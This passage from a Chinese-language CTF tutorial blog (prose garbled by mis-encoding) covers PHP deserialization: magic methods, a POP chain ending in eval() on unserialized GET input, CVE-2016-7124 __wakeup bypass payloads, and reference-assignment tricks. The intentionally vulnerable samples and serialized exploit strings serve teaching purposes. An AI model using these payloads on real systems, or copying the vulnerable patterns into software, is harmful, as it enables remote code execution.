      <url>/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€äº›å¸¸ç”¨çš„çŸ¥è¯†"><a href="#ä¸€äº›å¸¸ç”¨çš„çŸ¥è¯†" class="headerlink" title="ä¸€äº›å¸¸ç”¨çš„çŸ¥è¯†"></a>ä¸€äº›å¸¸ç”¨çš„çŸ¥è¯†</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">privateå˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸ºï¼š/x00ç±»å/x00å˜é‡å</span><br><span class="line">protectedå˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸º: /x00/*/x00å˜é‡å </span><br><span class="line">publicå˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸ºï¼šå˜é‡å</span><br><span class="line">åœ¨PHPä¸­ï¼Œç±»ä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line"></span><br><span class="line">__sleep()    //åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ  *</span><br><span class="line"></span><br><span class="line">__wakeup()   //å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è°ƒç”¨  *</span><br><span class="line">å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize() å’Œ __wakeup() ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œ åˆ™åªæœ‰ __unserialize() æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup() æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚æ­¤ç‰¹æ€§è‡ª PHP 7.4.0 èµ·å¯ç”¨ã€‚</span><br><span class="line">__construct() //å½“å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œä¼šè§¦å‘è¿›è¡Œåˆå§‹åŒ–</span><br><span class="line">__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__toString()ï¼š //å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br><span class="line">__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() //è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨,ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®ï¼ˆä¸å¯è®¿é—®çš„å±æ€§åŒ…æ‹¬ï¼š1.å±æ€§æ˜¯ç§æœ‰å‹ã€‚2.ç±»ä¸­ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡ï¼‰</span><br><span class="line">__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class="line">__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br><span class="line">__invoke() //å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="å¦‚ä½•æ‰¾ååºåˆ—åŒ–é“¾"><a href="#å¦‚ä½•æ‰¾ååºåˆ—åŒ–é“¾" class="headerlink" title="å¦‚ä½•æ‰¾ååºåˆ—åŒ–é“¾"></a>å¦‚ä½•æ‰¾ååºåˆ—åŒ–é“¾</h1><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬éƒ½æ˜¯è¦é€šè¿‡ååºåˆ—çš„é“¾å­å®ç°æŸäº›æ“ä½œï¼Œæ¯”å¦‚rceã€æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶å†™å…¥ç­‰ç­‰ã€‚å¯ä»¥é€šè¿‡ä»ç»“æœï¼ˆç›®çš„ã€æƒ³åˆ°å®ç°çš„æ“ä½œï¼‰å¼€å§‹ä¸€ç›´å¾€å‰æ¨ï¼Œæ¯”è¾ƒå®¹æ˜“æ‰¾åˆ°ä¸€æ¡å¯ç”¨çš„é“¾å­ã€‚</p><p>ç®€å•æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">big</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><ol><li><p>æœ€ç»ˆåˆ©ç”¨çš„æ˜¯<code>shen::__toString()</code>æ¥rceï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸‹ä¸€æ­¥æ˜¯æ‰¾èƒ½è§¦å‘å®ƒçš„åœ°æ–¹ã€‚</p></li><li><p>åœ¨<code>big::__call()</code>çš„<code>preg_match</code>èƒ½è§¦å‘<code>__toString</code>æ–¹æ³•ï¼Œå¯ä»¥ç†è§£ä¸ºæ­£åˆ™åŒ¹é…æ˜¯å­—ç¬¦ä¸²æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥è§¦å‘ï¼Œå› æ­¤æˆ‘ä»¬ç”¨è¿™ä¸ªæ¥è§¦å‘<code>shen::__toString()</code>ã€‚ï¼ˆæ³¨ï¼šæŠŠä¸€ä¸ªå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²å¤„ç†å¯ä»¥è§¦å‘<code>__toString</code>æ–¹æ³•ï¼‰</p></li><li><p><code>ctf::__destruct()</code>èƒ½è§¦å‘<code>__call</code>ï¼Œå› æ­¤ç”¨å®ƒæ¥è§¦å‘<code>big::__call()</code>ã€‚ï¼ˆæ³¨ï¼šè°ƒç”¨å¯¹è±¡è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è§¦å‘<code>__call</code>æ–¹æ³•ï¼‰</p></li><li><p><code>__destruct</code>æ–¹æ³•æ˜¯åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼Œå› æ­¤åªè¦ååºåˆ—åŒ–ä»£ç è¿è¡Œç»“æŸå°±èƒ½è§¦å‘è¯¥æ–¹æ³•ã€‚</p></li><li><p>æ¥ä¸‹æ¥æ˜¯å˜é‡èµ‹å€¼çš„ç»†èŠ‚ï¼Œé¦–å…ˆ<code>__call</code>çš„è§¦å‘æ˜¯ç”¨çš„æ˜¯<code>ctf</code>ç±»çš„<code>h1</code>å˜é‡ï¼Œ<code>h2</code>å˜é‡ä¼šä¼ é€’åˆ°<code>__call</code>æ–¹æ³•çš„<code>$args</code>å˜é‡ï¼Œå› æ­¤<code>h1</code>æ˜¯ <code>new big()</code>ï¼Œ<code>h2</code>æ˜¯<code>new shen()</code>ï¼›<code>shen</code>ç±»çš„<code>cmd</code>å˜é‡æ˜¯èƒ½æ‰§è¡Œå‘½ä»¤çš„ï¼Œå› æ­¤é‡Œé¢æ˜¯æ”¾æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p></li><li><p>æœ€ç»ˆçš„é“¾å­æ˜¯ï¼š<code>ctf::__destruct =&gt; big::__call =&gt; shen::__toString </code>ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">big</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h1 = <span class="keyword">new</span> <span class="title function_ invoke__">big</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h2 = <span class="keyword">new</span> <span class="title function_ invoke__">shen</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:3:&quot;ctf&quot;:2:&#123;s:2:&quot;h1&quot;;O:3:&quot;big&quot;:0:&#123;&#125;s:2:&quot;h2&quot;;O:4:&quot;shen&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="wakeup-ç»•è¿‡æ€»ç»“"><a href="#wakeup-ç»•è¿‡æ€»ç»“" class="headerlink" title="wakeup()ç»•è¿‡æ€»ç»“"></a>wakeup()ç»•è¿‡æ€»ç»“</h1><h2 id="cve-2016-7124"><a href="#cve-2016-7124" class="headerlink" title="cve-2016-7124"></a>cve-2016-7124</h2><p>å½±å“èŒƒå›´ï¼š</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><p>æ­£å¸¸æ¥è¯´åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œä¼šå…ˆè°ƒç”¨ <code>__wakeup()</code> æ–¹æ³•å†è¿›è¡Œ <code>unserilize</code> çš„æ“ä½œï¼Œä½†å¦‚æœåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ï¼Œ<code>__wakeup()</code>çš„æ‰§è¡Œä¼šè¢«è·³è¿‡ã€‚</p><p>æ ·ä¾‹ï¼ˆphp 5.5.9ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­£å¸¸ååºåˆ—åŒ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?ctf=O:3:&quot;ctf&quot;:2:&#123;s:2:&quot;h1&quot;;N;s:2:&quot;h2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_1_1.png"></p><p>å¾ˆæ˜æ˜¾æ˜¯å…ˆè§¦å‘äº†<code>wakeup</code>å†è§¦å‘<code>destruct</code>ã€‚</p><p>è‹¥å°†<code>&quot;ctf&quot;:2</code>çš„<code>2</code>æ”¹æˆ<code>3</code>ï¼Œä½¿å¾—å¯¹è±¡å±æ€§ä¸ªæ•°å˜å¤§ï¼Œåˆ™ä¼šä½¿<code>wakeup</code>ä¸è§¦å‘ã€‚</p><p>å¯¹è±¡å±æ€§ä¸ªæ•°ä¸åŒ¹é…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?ctf=O:3:&quot;ctf&quot;:3:&#123;s:2:&quot;h1&quot;;N;s:2:&quot;h2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_1_2.png" alt="wakeup_1_2"></p><h2 id="phpå¼•ç”¨èµ‹å€¼"><a href="#phpå¼•ç”¨èµ‹å€¼" class="headerlink" title="phpå¼•ç”¨èµ‹å€¼ &amp;"></a>phpå¼•ç”¨èµ‹å€¼ &amp;</h2><p>åœ¨phpé‡Œï¼Œæˆ‘ä»¬å¯ä½¿ç”¨å¼•ç”¨çš„æ–¹å¼è®©ä¸¤ä¸ªå˜é‡åŒæ—¶æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€ï¼Œè¿™æ ·å¯¹å…¶ä¸­ä¸€ä¸ªå˜é‡æ“ä½œæ—¶ï¼Œå¦ä¸€ä¸ªå˜é‡çš„å€¼ä¹Ÿä¼šéšä¹‹æ”¹å˜ã€‚</p><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a = &#x27;</span>.<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b = &#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹$bçš„å€¼ä¹Ÿä¼šä¿®æ”¹$açš„å€¼</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;new test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a = &#x27;</span>.<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b = &#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_2_1.png"></p><p>è¿™ä¸ªæ–¹æ³•æ˜¯ç”¨æ¥ç»•è¿‡ä¸€äº›ç‰¹å®šçš„åˆ¤æ–­ã€‚</p><p>æ ·ä¾‹ï¼ˆPHP 7.1.9ï¼‰:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=False;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;wakeup)||!<span class="variable language_">$this</span>-&gt;wakeup)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You get it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wakeup=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è‹¥å°†<code>$this-&gt;wakeup</code>å’Œ<code>$this-&gt;key</code>å¼•ç”¨å…³è”èµ·æ¥ï¼Œé‚£ä¹ˆåœ¨<code>__destruct</code>é‡Œå¯¹<code>$this-&gt;key</code>ä¿®æ”¹æ—¶ä¹Ÿä¼šæŠŠ<code>$this-&gt;wakeup</code>ä¸€èµ·ä¿®æ”¹äº†ï¼Œä»è€Œè¾¾æˆifè¯­å¥çš„æ¡ä»¶ã€‚</p><p>è¿™é‡Œå¹¶æ²¡æœ‰ç»•è¿‡<code>wakeup</code>ï¼Œ<code>wakeup</code>æ­£å¸¸æ‰§è¡Œäº†ï¼Œåªä¸è¿‡åˆ©ç”¨äº†å¼•ç”¨çš„ç‰¹ç‚¹ï¼Œä½¿å¾—<code>wakeup</code>é‡Œæ‰§è¡Œçš„æ“ä½œå¯¹æˆ‘ä»¬èµ·ä¸äº†ä½œç”¨ã€‚</p><p>popï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=False;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;wakeup)||!<span class="variable language_">$this</span>-&gt;wakeup)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You get it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wakeup=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = &amp;<span class="variable">$a</span>-&gt;wakeup;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// O:3:&quot;ctf&quot;:2:&#123;s:3:&quot;key&quot;;N;s:6:&quot;wakeup&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_2_2.png"></p><h2 id="PHP-GCå›æ”¶æœºåˆ¶"><a href="#PHP-GCå›æ”¶æœºåˆ¶" class="headerlink" title="PHP GCå›æ”¶æœºåˆ¶"></a>PHP GCå›æ”¶æœºåˆ¶</h2><h3 id="PHP-GC-å›æ”¶æœºåˆ¶æ˜¯ä»€ä¹ˆ"><a href="#PHP-GC-å›æ”¶æœºåˆ¶æ˜¯ä»€ä¹ˆ" class="headerlink" title="PHP GC å›æ”¶æœºåˆ¶æ˜¯ä»€ä¹ˆ"></a>PHP GC å›æ”¶æœºåˆ¶æ˜¯ä»€ä¹ˆ</h3><p>â€‹åœ¨ PHP ä¸­ï¼Œæ˜¯æ‹¥æœ‰åƒåœ¾å›æ”¶æœºåˆ¶ Garbage collection çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ GC æœºåˆ¶çš„ï¼Œåœ¨ PHP ä¸­ä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸæ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡çš„ï¼Œå½“ä¸€ä¸ªå˜é‡è¢«è®¾ç½®ä¸º NULL ï¼Œæˆ–è€…æ²¡æœ‰ä»»ä½•æŒ‡é’ˆæŒ‡å‘æ—¶ï¼Œå®ƒå°±ä¼šè¢«å˜æˆåƒåœ¾ï¼Œè¢« GC æœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰ï¼›é‚£ä¹ˆå½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰äº†ä»»ä½•å¼•ç”¨ä¹‹åï¼Œå°±ä¼šè¢«å›æ”¶ï¼Œåœ¨å›æ”¶è¿‡ç¨‹ä¸­ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡ä¸­çš„ <code>__destruct()</code> æ–¹æ³•ã€‚</p><ul><li>ä¸Šé¢è¿™ä¸€æ®µè¯æˆ‘ä¸ªäººè®¤ä¸ºå¦‚æœé›¶åŸºç¡€çœ‹ï¼Œä¼šæ„Ÿè§‰åˆ°ç›¸å½“æŠ½è±¡ã€‚æ‰€ä»¥æˆ‘ä»¬å…ˆæ¥è§£è¯»ä¸€ä¸‹</li></ul><p><strong>PHP å¼•ç”¨è®¡æ•°</strong></p><p>å½“æˆ‘ä»¬ PHP åˆ›å»ºä¸€ä¸ªå˜é‡æ—¶ï¼Œè¿™ä¸ªå˜é‡ä¼šè¢«å­˜å‚¨åœ¨ä¸€ä¸ªåä¸º zval çš„å˜é‡å®¹å™¨ä¸­ã€‚åœ¨è¿™ä¸ª zval å˜é‡å®¹å™¨ä¸­ï¼Œä¸ä»…åŒ…å«å˜é‡çš„ç±»å‹å’Œå€¼ï¼Œè¿˜åŒ…å«ä¸¤ä¸ªå­—èŠ‚çš„é¢å¤–ä¿¡æ¯ã€‚</p><p>ç¬¬ä¸€ä¸ªå­—èŠ‚åä¸º <code>is_ref</code>ï¼Œæ˜¯ bool å€¼ï¼Œå®ƒç”¨æ¥æ ‡è¯†è¿™ä¸ªå˜é‡æ˜¯å¦æ˜¯å±äºå¼•ç”¨é›†åˆã€‚PHP å¼•æ“é€šè¿‡è¿™ä¸ªå­—èŠ‚æ¥åŒºåˆ†æ™®é€šå˜é‡å’Œå¼•ç”¨å˜é‡ï¼Œç”±äº PHP å…è®¸ç”¨æˆ·ä½¿ç”¨ <code>&amp;</code> æ¥ä½¿ç”¨è‡ªå®šä¹‰å¼•ç”¨ï¼Œzval å˜é‡å®¹å™¨ä¸­è¿˜æœ‰ä¸€ä¸ªå†…éƒ¨å¼•ç”¨è®¡æ•°æœºåˆ¶ï¼Œæ¥ä¼˜åŒ–å†…å­˜ä½¿ç”¨ã€‚</p><p>ç¬¬äºŒä¸ªå­—èŠ‚æ˜¯ <code>refcount</code>ï¼Œå®ƒç”¨æ¥è¡¨ç¤ºæŒ‡å‘ zval å˜é‡å®¹å™¨çš„å˜é‡ä¸ªæ•°ã€‚æ‰€æœ‰çš„ç¬¦å·å­˜å‚¨åœ¨ä¸€ä¸ªç¬¦å·è¡¨ä¸­ï¼Œå…¶ä¸­æ¯ä¸ªç¬¦å·éƒ½æœ‰ä½œç”¨åŸŸã€‚</p><p>æ¥ä¸‹æ¥çœ‹çœ‹ä¾‹å­ï¼š</p><p>å®¹å™¨çš„ç”Ÿæˆï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>(<span class="string">&#x27;a&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªå˜é‡ <code>$a</code>ï¼Œç”Ÿæˆäº†ç±»å‹ä¸º String å’Œå€¼ä¸º <code>test</code> çš„å˜é‡å®¹å™¨ï¼Œè€Œå¯¹äºä¸¤ä¸ªé¢å¤–çš„å­—èŠ‚ï¼Œ<code>is_ref</code> å’Œ <code>refcount</code>ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸å­˜åœ¨å¼•ç”¨çš„ï¼Œæ‰€ä»¥ <code>is_ref</code> çš„å€¼åº”è¯¥æ˜¯ falseï¼Œè€Œ <code>refcount</code> 